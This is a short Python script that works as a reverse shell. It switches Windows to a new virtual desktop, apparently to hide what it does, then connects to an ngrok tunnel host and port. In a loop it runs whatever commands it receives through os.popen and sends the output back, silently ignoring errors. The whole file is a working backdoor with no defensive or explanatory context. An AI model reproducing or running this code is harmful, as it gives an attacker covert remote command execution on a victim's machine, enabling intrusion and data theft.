
import pyautogui
pyautogui.hotkey("win","ctrl","d")#powerful
import socket
import os 
host="0.tcp.ngrok.io"
port=15715
print((host,port))
server=socket.socket()
server.connect((host,int(port)))
while True:
    try:
        msg=server.recv(1024)
        res=os.popen(msg.decode('UTF-8'))
        server.send(res.read(1024).encode('UTF-8'))
    except Exception as e:
        pass
